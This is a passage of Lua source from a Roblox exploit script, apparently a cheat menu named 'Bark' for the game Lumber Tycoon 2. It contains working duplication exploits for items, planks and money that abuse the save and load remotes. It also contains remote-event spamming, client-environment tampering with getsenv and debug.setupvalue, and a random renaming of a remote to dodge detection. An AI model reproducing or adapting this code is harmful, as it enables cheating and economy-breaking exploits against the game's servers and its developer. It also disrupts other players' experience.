				if tostring(Y.Owner.Value) == tostring(game.Players.LocalPlayer) then
					fn = Y.OriginSquare.CFrame;
					break
				end
			end;
			for J, v in pairs(workspace.PlayerModels:GetChildren()) do
				if v:FindFirstChild'Owner' and v:FindFirstChild'Type' then
					if v.Owner.Value == game.Players.LocalPlayer then
						if math.abs(fn.Z - v.Main.CFrame.Z) >= 100 or math.abs(fn.X - v.Main.CFrame.X) >= 100 then
							if v.Type.Value == "Loose Item" or v.Type.Value == "Tool" or v.Type.Value == "Gift" or (v.Type.Value == "Structure" or v.Type.Value == "Furniture" or v.Type.Value == "Wire") and (v:FindFirstChild("PurchasedBoxItemName") or v:FindFirstChild("BoxItemName")) then
								dirtBaseDropInstant(v, fn)
							end
						end
					end
				end
			end
		end;
		local fn = nil;
		for al, Y in pairs(workspace.Properties:GetChildren()) do
			if tostring(Y.Owner.Value) == tostring(game.Players.LocalPlayer) then
				fn = Y.OriginSquare.CFrame;
				break
			end
		end;
		for J, v in pairs(workspace.PlayerModels:GetChildren()) do
			if v:FindFirstChild'Owner' and v:FindFirstChild'WoodSection' then
				if v.Owner.Value == game.Players.LocalPlayer then
					if v.TreeClass.Value ~= "PropertySoldSign" then
						if math.abs(fn.Z - v.WoodSection.CFrame.Z) >= 100 or math.abs(fn.X - v.WoodSection.CFrame.X) >= 100 then
							_G.DogixLT2TPC(v.WoodSection.CFrame, o)
							_G.DogixLT2DragAlt(v.WoodSection, fn)
						end
					end
				end
			end
		end;
		unwhitelist()
		k = was_disabling;
		game:GetService("ReplicatedStorage").LoadSaveRequests.RequestSave:InvokeServer(game:GetService("Players").LocalPlayer.CurrentSaveSlot.Value, game.Players.LocalPlayer)
		x('Self Dupe', 'Finished Self Auto-Dupe')
		f = false
	end;
	local fo = f6:CreateSection("Fast Load Slot")
	local fp = game.Players.LocalPlayer:FindFirstChild"CurrentSaveSlot" and (game.Players.LocalPlayer.CurrentSaveSlot.Value ~= -1 and game.Players.LocalPlayer.CurrentSaveSlot.Value or 1) or 1;
	fo:Create("Slider", "Selected Slot", function(v)
		fp = v
	end, {
		min = 1,
		max = 6,
		default = fp,
		changablevalue = true
	})
	fo:Create("Button", "Fast Load Slot", function(v)
		if not game:GetService("ReplicatedStorage").LoadSaveRequests.ClientMayLoad:InvokeServer(game.Players.LocalPlayer) then
			x("Fast Load", "Load is on cooldown. Waiting...", 3)
			repeat
				wait(5)
			until game:GetService("ReplicatedStorage").LoadSaveRequests.ClientMayLoad:InvokeServer(game.Players.LocalPlayer)
		end;
		x("Fast Load", "Auto-loading slot...", 3)
		local fq = loadSlotAuto(fp)
		if fq == true then
			game:GetService("Players").LocalPlayer.CurrentSaveSlot.Value = fp;
			x("Fast Load", "Finished loading slot.", 3)
		else
			x("Fast Load", "Failed loading slot.", 3)
		end
	end, {
		animated = true
	})
	local fr = f6:CreateSection("Transfer Items (BETA)")
	Transfer_slot = 1;
	fr:Create("Slider", "Selected Slot", function(v)
		Transfer_slot = v
	end, {
		min = 1,
		max = 6,
		default = Transfer_slot,
		changablevalue = true
	})
	fr:Create("Button", "Transfer Items To Selected Slot", function(v)
		if not game:GetService("ReplicatedStorage").LoadSaveRequests.ClientMayLoad:InvokeServer(game.Players.LocalPlayer) then
			x("Error", "Load is on cooldown. Waiting...", 3)
		elseif game:GetService("ReplicatedStorage").LoadSaveRequests.ClientMayLoad:InvokeServer(game.Players.LocalPlayer) then
			k = true;
			local eZ = Instance.new("BindableFunction", workspace)
			eZ.Name = "BARKINT_UiLibHandler"
			eZ.OnInvoke = function(v)
				e = 10;
				f = v == "Yes"
			end;
			game.StarterGui:SetCore("SendNotification", {
				Title = "Bark "..a,
				Text = "Only items on the origin part will be Transferred. Continue?",
				Icon = nil,
				Duration = 10,
				Button1 = "Yes",
				Button2 = "No",
				Callback = eZ
			})
			repeat
				wait(1)
				e = e + 1
			until e >= 10;
			eZ:Destroy()
			if f then
				x('Bark '..a, 'Starting Self-Transfer, Please Wait...')
				selfdupe()
				loadSlotAuto(Transfer_slot)
				local fs = game.Players.LocalPlayer;
				local fn = nil;
				for al, Y in pairs(workspace.Properties:GetChildren()) do
					if tostring(Y.Owner.Value) == tostring(fs) then
						fn = Y.OriginSquare.CFrame;
						print(fn)
						break
					end
				end;
				for J, v in pairs(workspace.PlayerModels:GetChildren()) do
					if v:FindFirstChild'Owner' and v:FindFirstChild'Type' then
						if v.Owner.Value == game.Players.LocalPlayer then
							if v.Type.Value == "Loose Item" or v.Type.Value == "Tool" or v.Type.Value == "Gift" or (v.Type.Value == "Structure" or v.Type.Value == "Furniture" or v.Type.Value == "Wire") and (v:FindFirstChild("PurchasedBoxItemName") or v:FindFirstChild("BoxItemName")) then
								dirtBaseDropInstant(v, fn)
							end
						end
					end
				end
			end;
			local fn = nil;
			for al, Y in pairs(workspace.Properties:GetChildren()) do
				if tostring(Y.Owner.Value) == tostring(game.Players.LocalPlayer) then
					fn = Y.OriginSquare.CFrame;
					break
				end
			end;
			for J, v in pairs(workspace.PlayerModels:GetChildren()) do
				if v:FindFirstChild'Owner' and v:FindFirstChild'WoodSection' then
					if v.Owner.Value == game.Players.LocalPlayer then
						if v.TreeClass.Value ~= "PropertySoldSign" then
							if math.abs(fn.Z - v.WoodSection.CFrame.Z) >= 100 or math.abs(fn.X - v.WoodSection.CFrame.X) >= 100 then
								_G.DogixLT2DragAlt(v.WoodSection, fn)
							end
						end
					end
				end
			end;
			unwhitelist()
			k = was_disabling;
			game:GetService("ReplicatedStorage").LoadSaveRequests.RequestSave:InvokeServer(Transfer_slot, game.Players.LocalPlayer)
			x('Bark '..a, 'Finished Transfer.')
			f = false
		end
	end, {
		animated = true
	})
	fr:Create("Button", "Self Dupe Current Slot", function(v)
		selfdupeon()
	end, {
		animated = true
	})
end;
if getconnections then
	local ft = false;
	local fu = false;
	function loadSlotAuto(fv)
		if ft == false and not sentinelbuy then
			local fw = getsenv(game:GetService("Players").LocalPlayer.PlayerGui.PropertyPurchasingGUI.PropertyPurchasingClient)
			local au = fw.enterPurchaseMode;
			getsenv(game:GetService("Players").LocalPlayer.PlayerGui.PropertyPurchasingGUI.PropertyPurchasingClient).enterPurchaseMode = function(...)
				if not fu then
					return au(...)
				else
					local fx = nil;
					for J, v in pairs(workspace.Properties:children()) do
						if v.Owner.Value == nil then
							fx = v;
							break
						end
					end;
					debug.setupvalue(fw.rotate, 3, 0)
					debug.setupvalue(au, 10, fx)
					return
				end
			end;
			ft = true
		end;
		local fq = nil;
		spawn(function()
			fq = game:GetService("ReplicatedStorage").LoadSaveRequests.RequestLoad:InvokeServer(fv, game.Players.LocalPlayer)
		end)
		if not ft then
			repeat
				wait()
			until game.Players.LocalPlayer.PlayerGui.PropertyPurchasingGUI.SelectPurchase.Visible;
			wait(1)
			game:GetService("VirtualInputManager"):SendKeyEvent(true, "E", false, game)
			wait(1.5)
			game:GetService("VirtualInputManager"):SendKeyEvent(true, "E", false, game)
		else
			fu = true
		end;
		repeat
			wait()
		until fq ~= nil;
		fu = false;
		return fq
	end;
	local fy = f6:CreateSection("Auto-Dupe")
	local fz = game.Players.LocalPlayer:FindFirstChild"CurrentSaveSlot" and (game.Players.LocalPlayer.CurrentSaveSlot.Value ~= -1 and game.Players.LocalPlayer.CurrentSaveSlot.Value or 1) or 1;
	fy:Create("TextLabel", "Alex uncap labels nob.", {})
	_G.CurrentBarkUI.Motherframe.Categories.SlotCategory["Auto-DupeSection"]["Alex uncap labels nob.TextLabel"].TextLabel.Text = "With dupe scripts, there's a chance your base may wipe."
	fy:Create("Slider", "Selected Slot", function(v)
		fz = v
	end, {
		min = 1,
		max = 6,
		default = fz,
		changablevalue = true
	})
	local fs = game.Players.LocalPlayer;
	fy:Create("Dropdown", "To Player", function(e5)
		fs = e5
	end, {
		text = "",
		search = true,
		playerlist = true
	})
	local fA = 0;
	function dirtBaseDropInstant(v, fn, fB, fC)
		local fD = game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedStructure;
		fD.Name = game:GetService("HttpService"):GenerateGUID(false) -- makes it harder on skids (hacker)
		fD:FireServer(fC or nil, fn, game.Players.LocalPlayer, fB or nil, v, true)
		game:GetService("RunService").Stepped:wait()
		if fA == 100 then
		    wait(0.2)
		    fA = 1
		else
		    fA = fA + 1
		end
		fD.Name = "ClientPlacedStructure"
	end;
	fy:Create("Button", "Start Auto-Dupe Items", function(v)
		if fs == game.Players.LocalPlayer then
			x("Auto-Dupe", "Please select a player to base drop!", 3)
			return
		end;
		local fn = nil;
		for al, Y in pairs(workspace.Properties:GetChildren()) do
			if tostring(Y.Owner.Value) == tostring(fs) then
				fn = Y.OriginSquare.CFrame;
				break
			end
		end;
		if fn == nil then
			x("Auto-Dupe", "The selected player is not loaded!", 3)
			return
		end;
		fs = game.Players[tostring(fs)]
		if not game:GetService("ReplicatedStorage").Interaction.ClientIsWhitelisted:InvokeServer(fs) then
			x("Auto-Dupe", "The selected player **needs to whitelist** YOU!", 3)
			return
		end;
		if not game:GetService'Players'.LocalPlayer.WhitelistFolder:FindFirstChild(tostring(fs)) then
			x("Auto-Dupe", "Automatically whitelisted "..tostring(fs)..".", 3)
			game.ReplicatedStorage.Interaction.ClientSetListPlayer:InvokeServer(game:GetService'Players'.LocalPlayer.WhitelistFolder, fs, true)
		end;
		if fz < 1 then
			if game.Players.LocalPlayer.CurrentSaveSlot.Value < 1 then
				x("Auto-Dupe", "Please select a slot to use!", 3)
				return
			else
				fz = game.Players.LocalPlayer.CurrentSaveSlot.Value;
				x("Auto-Dupe", "No slot selected, defaulting to current slot.", 3)
			end
		end;
		if game.Players.LocalPlayer.CurrentSaveSlot.Value ~= fz then
			if not game:GetService("ReplicatedStorage").LoadSaveRequests.ClientMayLoad:InvokeServer(game.Players.LocalPlayer) then
				x("Auto-Dupe", "Load is on cooldown. Waiting...", 3)
				repeat
					wait(5)
				until game:GetService("ReplicatedStorage").LoadSaveRequests.ClientMayLoad:InvokeServer(game.Players.LocalPlayer)
			end;
			x("Auto-Dupe", "Loading slot...", 3)
			local fq = loadSlotAuto(fz)
			if fq == false then
				x("Auto-Dupe", "An error has occured while attempting to load slot.", 3)
				return
			else
				game.Players.LocalPlayer.CurrentSaveSlot.Value = fz;
				x("Auto-Dupe", "Loaded slot, starting Base-Drop.", 3)
			end
		end;
		local was_disabling = k;
		k = true;
		for J, v in pairs(workspace.PlayerModels:GetChildren()) do
			if v:FindFirstChild'Owner' and v:FindFirstChild'Type' then
				if v.Owner.Value == game.Players.LocalPlayer then
					if v.Type.Value == "Loose Item" or v.Type.Value == "Tool" or v.Type.Value == "Gift" or (v.Type.Value == "Structure" or v.Type.Value == "Furniture" or v.Type.Value == "Wire") and (v:FindFirstChild("PurchasedBoxItemName") or v:FindFirstChild("BoxItemName")) then
						dirtBaseDropInstant(v, fn)
					end
				end
			end
		end;
		x("Auto-Dupe", "Finished Base-Drop, reloading.", 3)
		if not game:GetService("ReplicatedStorage").LoadSaveRequests.ClientMayLoad:InvokeServer(game.Players.LocalPlayer) then
			x("Auto-Dupe", "Load is on cooldown. Waiting...", 3)
			repeat
				wait(5)
			until game:GetService("ReplicatedStorage").LoadSaveRequests.ClientMayLoad:InvokeServer(game.Players.LocalPlayer)
		end;
		if loadSlotAuto(fz) then
			game.Players.LocalPlayer.CurrentSaveSlot.Value = fz
		end;
		k = was_disabling;
		x("Auto-Dupe", "Finished.", 3)
	end, {
		animated = true
	})
	fy:Create("Button", "Start Auto-Dupe Planks", function(v)
		if fs == game.Players.LocalPlayer then
			x("Auto-Dupe", "Please select a player to base drop!", 3)
			return
		end;
		local fn = nil;
		for al, Y in pairs(workspace.Properties:GetChildren()) do
			if tostring(Y.Owner.Value) == tostring(fs) then
				fn = Y.OriginSquare.CFrame;
				break
			end
		end;
		if fn == nil then
			x("Auto-Dupe", "The selected player is not loaded!", 3)
			return
		end;
		fs = game.Players[tostring(fs)]
		if not game:GetService("ReplicatedStorage").Interaction.ClientIsWhitelisted:InvokeServer(fs) then
			x("Auto-Dupe", "The selected player **needs to whitelist** YOU!", 3)
			return
		end;
		if not game:GetService'Players'.LocalPlayer.WhitelistFolder:FindFirstChild(tostring(fs)) then
			x("Auto-Dupe", "Automatically whitelisted "..tostring(fs)..".", 3)
			game.ReplicatedStorage.Interaction.ClientSetListPlayer:InvokeServer(game:GetService'Players'.LocalPlayer.WhitelistFolder, fs, true)
		end;
		if fz < 1 then
			if game.Players.LocalPlayer.CurrentSaveSlot.Value < 1 then
				x("Auto-Dupe", "Please select a slot to use!", 3)
				return
			else
				fz = game.Players.LocalPlayer.CurrentSaveSlot.Value;
				x("Auto-Dupe", "No slot selected, defaulting to current slot.", 3)
			end
		end;
		if game.Players.LocalPlayer.CurrentSaveSlot.Value ~= fz then
			if not game:GetService("ReplicatedStorage").LoadSaveRequests.ClientMayLoad:InvokeServer(game.Players.LocalPlayer) then
				x("Auto-Dupe", "Load is on cooldown. Waiting...", 3)
				repeat
					wait(5)
				until game:GetService("ReplicatedStorage").LoadSaveRequests.ClientMayLoad:InvokeServer(game.Players.LocalPlayer)
			end;
			x("Auto-Dupe", "Loading slot...", 3)
			local fq = loadSlotAuto(fz)
			if fq == false then
				x("Auto-Dupe", "An error has occured while attempting to load slot.", 3)
				return
			else
				game.Players.LocalPlayer.CurrentSaveSlot.Value = fz;
				x("Auto-Dupe", "Loaded slot, starting Base-Drop.", 3)
			end
		end;
		local was_disabling = k;
		k = true;
		local fn = nil;
		for al, Y in pairs(workspace.Properties:GetChildren()) do
			if tostring(Y.Owner.Value) == tostring(fs) then
				fn = Y.OriginSquare;
				break
			end
		end;
		for J, v in pairs(workspace.PlayerModels:GetChildren()) do
			if v:FindFirstChild'Owner' and v:FindFirstChild'WoodSection' then
				if v.Owner.Value == game.Players.LocalPlayer then
					if v.TreeClass.Value ~= "PropertySoldSign" then
						_G.DogixLT2DragAlt(v.WoodSection, fn.CFrame)
					end
				end
			end
		end;
		x("Auto-Dupe", "Finished Base-Drop, reloading.", 3)
		if not game:GetService("ReplicatedStorage").LoadSaveRequests.ClientMayLoad:InvokeServer(game.Players.LocalPlayer) then
			x("Auto-Dupe", "Load is on cooldown. Waiting...", 3)
			repeat
				wait(5)
			until game:GetService("ReplicatedStorage").LoadSaveRequests.ClientMayLoad:InvokeServer(game.Players.LocalPlayer)
		end;
		if loadSlotAuto(fz) then
			game.Players.LocalPlayer.CurrentSaveSlot.Value = fz
		end;
		k = was_disabling;
		x("Auto-Dupe", "Finished.", 3)
	end, {
		animated = true
	})
	fy:Create("Button", "Start Auto-Dupe Money", function(v)
		if moneyCooldown then
			x("Auto-Dupe", "Waiting for money cooldown.", 3)
			repeat
				wait(5)
			until not moneyCooldown
		end;
		if fz < 1 then
			if game.Players.LocalPlayer.CurrentSaveSlot.Value < 1 then
				x("Auto-Dupe", "Please select a slot to use!", 3)
				return
			else
				fz = game.Players.LocalPlayer.CurrentSaveSlot.Value;
				x("Auto-Dupe", "No slot selected, defaulting to current slot.", 3)
			end
		end;
		if game.Players.LocalPlayer.CurrentSaveSlot.Value ~= fz then
			if not game:GetService("ReplicatedStorage").LoadSaveRequests.ClientMayLoad:InvokeServer(game.Players.LocalPlayer) then
				x("Auto-Dupe", "Load is on cooldown. Waiting...", 3)
				repeat
					wait(5)
				until game:GetService("ReplicatedStorage").LoadSaveRequests.ClientMayLoad:InvokeServer(game.Players.LocalPlayer)
			end;
			x("Auto-Dupe", "Loading slot...", 3)
			local fq = loadSlotAuto(fz)
			if fq == false then
				x("Auto-Dupe", "An error has occured while attempting to load slot.", 3)
				return
			else
				game.Players.LocalPlayer.CurrentSaveSlot.Value = fz;
				x("Auto-Dupe", "Waiting for reload timer.", 3)
			end
		end;
		local was_disabling = k;
		k = true;
		spawn(function()
			dupemoney(true)
		end)
		if not game:GetService("ReplicatedStorage").LoadSaveRequests.ClientMayLoad:InvokeServer(game.Players.LocalPlayer) then
			x("Auto-Dupe", "Load is on cooldown. Waiting...", 3)
			repeat
				wait(5)
			until game:GetService("ReplicatedStorage").LoadSaveRequests.ClientMayLoad:InvokeServer(game.Players.LocalPlayer)
		end;
		if loadSlotAuto(fz) then
			game.Players.LocalPlayer.CurrentSaveSlot.Value = fz
		end;
		k = was_disabling;
		x("Auto-Dupe", "Finished.", 3)
	end, {
		animated = true
	})
end;
local fE = f6:CreateSection("Base Sorter")
local fF = nil;
local selectedList = {}
local fG = false;
fE:Create("Button", "Get Item Selection Tool", function(v)
	Identify = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
	Identify.RequiresHandle = false;
	Identify.Name = "Select"
	Identify.Activated:connect(function()
		local item = getMouseTarget().Parent;
		local u = item:FindFirstChild"PurchasedBoxItemName" or item:FindFirstChild"BoxItemName" or item:FindFirstChild"ItemName" or item:FindFirstChild"TreeClass"
		if not u then
			x("Base Sorter", "Couldn't identify item.", 3)
		else
			u = u.Value;
			if fG then
				local fH = false;
				for J, v in pairs(selectedList) do
					if v == u then
						selectedList[J] = nil;
						fH = true
					end
				end;
				if fH then
					x("Base Sorter", "Unselected "..u..".", 3)
				else
					table.insert(selectedList, u)
					x("Base Sorter", "Selected "..u..".", 3)
					fF = u
				end
			else
				x("Base Sorter", "Selected "..u..".", 3)
				fF = u;
				print(fF)
			end
		end
	end)
end, {
	animated = true
})
fE:Create("Toggle", "Multi-Select", function(v)
	fG = v;
	selectedList = {}
end, {
	animated = false
})
function dropMeme(fI, CFrame)
	for J, v in pairs(workspace.PlayerModels:children()) do
		if v:FindFirstChild'Owner' and (v:FindFirstChild"ItemName" or v:FindFirstChild"PurchasedBoxItemName") then
			local fJ = v:FindFirstChild"ItemName" or v:FindFirstChild"PurchasedBoxItemName"
			if tostring(v.Owner.Value) == game.Players.LocalPlayer.Name and fJ.Value == fI then
				dirtBaseDropInstant(v, CFrame or v.PrimaryPart.CFrame - Vector3.new(0, .1, 0))
			end
		end
	end
end; -- code == wack
fE:Create("Button", "Bring Selected Item", function(db)
	if fF == nil and selectedList == {} then
		x("Base Sorter", "No item detected!", 3)
		return
	end;
	local fn = nil;
	for al, Y in pairs(workspace.Properties:GetChildren()) do
		if Y.Owner.Value == game.Players.LocalPlayer then
			fn = Y.OriginSquare.CFrame;
			break
		end
	end;
	if math.abs(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z - fn.Z) > 100 or math.abs(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X - fn.X) > 100 then
		x("Base Sorter", "You cannot sort off of your plot.", 3)
		return
	end;
	local CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
	if fG then
		for J, v in pairs(selectedList) do
			dropMeme(v, CFrame)
		end; 
		selectedList = {}
	else
		dropMeme(fF, CFrame)
	end;
	x("Base Sorter", "Finished.", 3)
end, {
	animated = true
})
function bringplanka(fK)
	for J, v in pairs(workspace.PlayerModels:children()) do
		if v:FindFirstChild("Owner") and v.Owner.Value == game.Players.LocalPlayer and v:FindFirstChild("TreeClass").Value == fK then
			for J = 1, 2 do
				game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(v.WoodSection)
				v.WoodSection.CFrame = CF;
				game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(v.WoodSection)
				v.WoodSection.CFrame = CF;
				game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v.WoodSection)
				v.WoodSection.CFrame = CF;
				wait(.04)
			end
		end
	end
end;
fE:Create("Button", "Bring Selected Plank", function(db)
	local CF = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
	if fG then
		for J, v in pairs(selectedList) do
			bringplanka(v)
		end
	else
		bringplanka(v)
	end
end, {
	animated = true
})
local fL = f6:CreateSection("Car Spawner")
local eQ = ""
fL:Create("Dropdown", "Car Selection", function(db)
	eQ = db
end, {
	options = {
		"Hot pink",
		"Medium stone grey",
		"Sand green",
		"Sand red",
		"Faded green",
		"Dark grey metallic",
		"Dark grey",
		"Earth yellow",
		"Earth orange",
		"Silver",
		"Brick yellow",
		"Dark red",
		"Rust",
		"Really black",
		"Lemon metalic"
	},
	search = true,
	default = "Hot pink"
})
local fM = true;
fL:Create("Toggle", "Destroy Spawn Pad", function(v)
	fM = v
end, {
	default = true
})
fL:Create("Button", "Spawn Car", function(v)
	local aH = game:GetService'Players'.LocalPlayer;
	local N = aH:GetMouse()
	local part = nil;
	local f3 = N.Button1Up:connect(function()
		part = getMouseTarget()
	end)
	x("Car Spawner", "Left Click the spawn button of a vehicle pad to spawn a car.", 3)
	repeat
		wait()
	until part ~= nil;
	f3:Disconnect()
	f3 = nil;
	if part.Name == "SpawnButton" then
		local fN = part.Parent;
		if fN.Owner.Value ~= aH then
			return
		end;
		fN.Name = "_BARK_"..math.random(1000000, 9999999)
		local dF = fN.ButtonRemote_SpawnButton;
		_G.stop_carspawn = false;
		repeat
			local fO = false;
			game:GetService("ReplicatedStorage").Interaction.RemoteProxy:FireServer(dF)
			local cadded = workspace.PlayerModels.ChildAdded:connect(function(v)
				v:WaitForChild("Owner")
				if v:FindFirstChild("Owner") and v.Owner.Value == aH then
					v:WaitForChild("PaintParts")
					v.PaintParts:WaitForChild("Part")
					if tostring(v.PaintParts.Part.BrickColor) == eQ then
						_G.stop_carspawn = true;
						if fM then
							game:GetService("ReplicatedStorage").Interaction.DestroyStructure:FireServer(fN)
						end
					else
						if cadded ~= nil then
							cadded:Disconnect()
							cadded = nil
						end;
						fO = true
					end
				end
			end)
			wait(0.25)
			repeat
				wait()
			until fO
		until _G.stop_carspawn
	end
end, {
	animated = true
})
fL:Create("Button", "Cancel Spawn Pink Car", function(v)
	_G.stop_carspawn = true
end, {
	animated = true
})
local fL = f6:CreateSection("Firework Spammer")
fL:Create("Button", "Firework Spammer", function(v)
	local aH = game:GetService'Players'.LocalPlayer;
	local N = aH:GetMouse()
	local part = nil;
	local f3 = N.Button1Up:connect(function()
		part = getMouseTarget()
	end)
	x("Firework Spammer", "Left Click the spawn button of a firework launcher to spam fireworks!")
	repeat
		wait()
	until part;
	f3:Disconnect()
	f3 = nil;
	if part.Name == "Button" then
		local fP = part.Parent;
		if fP.Owner.Value ~= aH then
			return
		end;
		local dF = fP.ButtonRemote_Button;
		_G.stop_firespam = false;
		repeat
			game:GetService("ReplicatedStorage").Interaction.RemoteProxy:FireServer(dF)
			game:GetService'RunService'.Stepped:wait()
		until _G.stop_firespam
	end
end, {
	animated = true
})
fL:Create("Button", "Stop Firework Spammer", function(v)
	_G.stop_firespam = true
end, {
	animated = true
})
local d7 = "Items"
if d then
	d7 = 5182389282
end;
local fQ = d6:CreateCategory(d7)
local fR = fQ:CreateSection("Logs")
fR:Create("Button", "Teleport Logs", function(v)
	local aB = game:GetService'Players'.LocalPlayer.Character;
	local fS = aB.HumanoidRootPart.CFrame;
	for J, v in pairs(workspace.LogModels:children()) do
		if v.Name:sub(1, 6) == "Loose_" and v.Owner ~= nil then
			if v.Owner.Value == game:GetService'Players'.LocalPlayer then
				part = v.WoodSection;
				_G.DogixLT2TPC(part.CFrame, o)
				wait(0.4)
				for J = 1, 20 do
					game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
					v:MoveTo(fS.p)
					wait()
				end;
				_G.DogixLT2TPC(fS, o)
			end
		end
	end
end, {
	animated = true
})
fR:Create("Button", "Sell Logs", function(v)
	local aH = game:GetService'Players'.LocalPlayer;
	local aJ = aH.Character.HumanoidRootPart.Position;
	for J, v in pairs(workspace.LogModels:children()) do
		if v.Name:sub(1, 6) == "Loose_" and v:FindFirstChild'Owner' then
			if v.Owner.Value == aH then
				_G.DogixLT2TPC(v:FindFirstChildOfClass("Part").CFrame, o)
				for J = 1, 50 do
					wait()
					for cD, Y in pairs(v:children()) do
						if Y:IsA("BasePart") then
							Y.CFrame = CFrame.new(Vector3.new(315, -0.296, 85.791)) * CFrame.Angles(math.rad(15), 0, 0)
							game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Y)
							game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(Y)
						end
					end
				end;
				_G.DogixLT2TPC(aJ, 1 + o)
				wait(0.5)
			end
		end
	end
end, {
	animated = true
})
local fT = fQ:CreateSection("Mod Logs")
fT:Create("Button", "Mod using Axe Method (recommended)", function(v)
	local aH = game:GetService'Players'.LocalPlayer;
	local aB = aH.Character;
	local aJ = aH.Character.HumanoidRootPart.CFrame;
	local fU = nil;
	local fV = nil;
	local f2 = false;
	local f3 = N.Button1Up:connect(function()
		local part = getMouseTarget()
		if part.Parent:FindFirstChild("Owner") then
			if part.Parent:FindFirstChild("Owner").Value ~= aH then
				f2 = true;
				x("Mod Logs", "Cancelled.", 2)
				return
			end
		end;
		if part.Parent.Name:sub(1, 6) == "Loose_" then
			x("Mod Logs", "Selected tree.", 2)
			fU = part.Parent
		elseif part.Parent.Name:sub(1, 7) == "Sawmill" or part.Parent:FindFirstChild"ItemName" and part.Parent.ItemName.Value:sub(1, 7) == "Sawmill" then
			x("Mod Logs", "Selected sawmill.", 2)
			fV = part.Parent
		elseif part.Parent.Parent.Name:sub(1, 7) == "Sawmill" or part.Parent.Parent:FindFirstChild"ItemName" and part.Parent.Parent.ItemName.Value:sub(1, 7) == "Sawmill" then
			x("Mod Logs", "Selected sawmill.", 2)
			fV = part.Parent.Parent
		else
			x("Mod Logs", "Cancelled. (if you're trying to select a tree, make sure you own it and hold an axe or move farther)", 2)
			f2 = true
		end
	end)
	x("Mod Logs", "Please click a cut tree and a placed sawmill. Click elsewhere to cancel.", 3)
	repeat
		wait()
	until fU ~= nil and fV ~= nil or f2;
	f3:Disconnect()
	f3 = nil;
	if f2 then
		return
	end;
	local Wood = fU.TreeClass.Value;
	local co = getHitPointsTbl()
	if not aB:FindFirstChild'Tool' then
		if not aH.Backpack:FindFirstChild'Tool' then
			x("Mod Logs", "You need an axe to use this feature!", 3)
			return
		end
	end;
	local cp = getBestAxe()
	function axe(v)
		local cr = co[cp.ToolName.Value]
		if Wood == "LoneCave" and cp.ToolName.Value == "EndTimesAxe" then
			cr = 10000000
		end;
		if Wood == "Volcano" and cp.ToolName.Value == "FireAxe" then
			cr = 6.35
		end;
		local table = {
			["tool"] = cp,
			["faceVector"] = Vector3.new(0, 0, -1),
			["height"] = 0.3,
			["sectionId"] = 1,
			["hitPoints"] = cr,
			["cooldown"] = 0.1,
			["cuttingClass"] = "Axe"
		}
		game:GetService("ReplicatedStorage").Interaction.RemoteProxy:FireServer(v.CutEvent, table)
	end;
	local cF = nil;
	local fW = nil;
	for cD, Y in pairs(fU:children()) do
		if Y:IsA"BasePart" then
			if not Y:FindFirstChildOfClass("Weld") then
				if Y.ID.Value ~= 1 then
					if Y:FindFirstChild("ParentID") then
						if Y.ParentID.Value ~= 1 then
							if cF == nil then
								cF = Y
							end;
							if Y.Size.Z < cF.Size.Z then
								cF = Y
							end
						end
					end
				end
			end
		end
	end;
	for cD, Y in pairs(fU:children()) do
		if Y:IsA"BasePart" then
			if Y.ID.Value == cF.ParentID.Value then
				fW = Y;
				break
			end
		end
	end;
	local Z = Instance.new("BoxHandleAdornment", cF)
	Z.Name = "Selection"
	Z.Adornee = Z.Parent;
	Z.AlwaysOnTop = true;
	Z.ZIndex = 0;
	Z.Size = Z.Parent.Size;
	Z.Transparency = 0;
	Z.Color = BrickColor.new("Lime green")
	local Z = Instance.new("BoxHandleAdornment", fW)
	Z.Name = "Selection"
	Z.Adornee = Z.Parent;
	Z.AlwaysOnTop = true;
	Z.ZIndex = 0;
	Z.Size = Z.Parent.Size;
	Z.Transparency = 0;
	Z.Color = BrickColor.new("Really red")
	local eu = false;
	x("Mod Logs", "Glitching tree, this should take a few seconds.", 2)
	local es = workspace["Region_Volcano"]:FindFirstChild("Lava") or game.Lighting:FindFirstChild("Lava")
	if es.Parent == game.Lighting then
		eu = true;
		es.Parent = workspace["Region_Volcano"]
	end;
	es = es.Lava;
	local fX = es.CFrame;
	local fY = es.Size;
	repeat
		wait()
		es.CFrame = fW.CFrame;
		workspace["Region_Volcano"].Lava.Lava.Size = Vector3.new(0, 0, 0)
		game:GetService"ReplicatedStorage".Interaction.ClientIsDragging:FireServer(fU)
	until fW:FindFirstChildOfClass("Fire")
	fW:FindFirstChildOfClass("Fire"):Destroy()
	local fZ = false;
	fW.AncestryChanged:Connect(function()
		fZ = true
	end)
	repeat
		for J = 1, 7 do
			wait()
			fW.CFrame = CFrame.new(315, -2, 86)
			game:GetService"ReplicatedStorage".Interaction.ClientIsDragging:FireServer(fU)
			game:GetService"ReplicatedStorage".Interaction.ClientRequestOwnership:FireServer(fU)
		end
	until fZ;
	es.CFrame = fX;
	es.Size = fY;
	if eu then
		es.Parent.Parent = game.Lighting;
		eu = false
	end;
	fZ = false;
	x("Mod Logs", "Updating parts for sawmill to work.", 3)
	local cG = false;
	local cH = workspace.LogModels.ChildAdded:Connect(function(v)
		v:WaitForChild("Owner")
		if v:FindFirstChild("Owner") and v.Owner.Value == aH and v.TreeClass.Value == Wood then
			cG = true
		end
	end)
	_G.DogixLT2TPC(fU.WoodSection.CFrame + Vector3.new(4, 2, 2), o)
	repeat
		wait(0.1)
		if fU:FindFirstChild("CutEvent") ~= nil then
			axe(fU)
			wait()
		end;
		cF.CFrame = fV.Particles.CFrame;
		game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(cF)
	until cG;
	cH:Disconnect()
	cH = nil;
	cG = false;
	x("Mod Logs", "Finished.", 3)
end, {
	animated = true
})
fT:Create("Button", "Mod using Sell Method (old)", function(v)
	local aH = game:GetService'Players'.LocalPlayer;
	local aJ = aH.Character.HumanoidRootPart.Position;
	for J, v in pairs(workspace.LogModels:children()) do
		if v.Name:sub(1, 6) == "Loose_" and v:FindFirstChild'Owner' then
			if v.Owner.Value == aH then
